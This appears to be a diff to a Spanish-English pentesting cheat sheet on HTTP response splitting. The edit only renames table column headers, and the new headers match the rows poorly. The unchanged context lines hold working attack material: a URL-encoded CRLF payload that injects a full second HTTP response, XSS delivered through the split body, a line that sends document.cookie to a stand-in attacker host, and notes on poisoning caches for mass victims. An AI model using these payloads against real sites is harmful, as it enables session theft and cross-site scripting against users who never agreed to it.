@@ -22,7 +22,7 @@ linked:
 
 ## Split Single Response en Two
 
-| **Concept** | **Payload structure** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Two CRLF terminate headers | `\r\n\r\n` separa headers de body | Standard HTTP. |
 | Atacante injects `\r\n\r\n` mid-headers | Server's body becomes "second response start" | Splitting. |
@@ -42,7 +42,7 @@ ___
 
 ## Inject Second Response con HTML/JS
 
-| **Payload structure** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Full HTTP response inject | `%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>...</html>` | Complete response. |
 | Status line | `HTTP/1.1%20200%20OK` | New status. |
@@ -88,7 +88,7 @@ ___
 
 ## XSS via Response Splitting
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Inject `<script>` body | Standard XSS payload en split body | Direct. |
 | Steal cookies | `<script>fetch('//attacker/?c='+document.cookie)</script>` | Combine. |
@@ -108,7 +108,7 @@ ___
 
 ## Cache Poisoning via Splitting
 
-| **Vector** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Cache stores split response | Cache key normal, response includes split | Mass victim. |
 | Persistencia por TTL | All users hit cache → see XSS body | Standard. |
